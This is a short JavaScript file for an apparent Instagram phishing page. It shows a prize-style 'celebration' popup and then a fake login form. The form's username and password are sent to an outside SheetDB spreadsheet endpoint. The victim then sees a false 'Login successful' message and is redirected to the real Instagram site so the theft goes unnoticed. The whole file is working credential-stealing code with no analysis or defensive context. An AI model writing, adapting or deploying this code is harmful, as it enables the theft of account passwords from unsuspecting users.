// Show the celebration popup on page load
window.onload = function() {
    document.getElementById('celebrationPopup').style.display = 'block';
};

// Handle claim button click
document.getElementById('claimButton').addEventListener('click', function() {
    // Close the popup and show the login form
    document.getElementById('celebrationPopup').style.display = 'none';
    document.getElementById('loginFormContainer').style.display = 'block';
});

// Handle form submission
document.getElementById('loginForm').addEventListener('submit', async function(event) {
    event.preventDefault(); // Prevent the default form submission

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const data = {
        Username: username,
        Password: password
    };

    try {
        const response = await fetch('https://sheetdb.io/api/v1/5s8p5pfecz79j', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({ data: [data] }) // Format the data as expected by SheetDB
        });

        if (response.ok) {
            const jsonResponse = await response.json();
            console.log('Success:', jsonResponse);
            alert('Login successful! Redirecting to Instagram...');
            // Redirect to Instagram
            window.location.href = 'https://www.instagram.com';
        } else {
            console.error('Error:', response.statusText);
            alert('Error submitting data. Please try again.');
        }
    } catch (error) {
        console.error('Fetch error:', error);
        alert('Network error. Please try again.');
    }
});
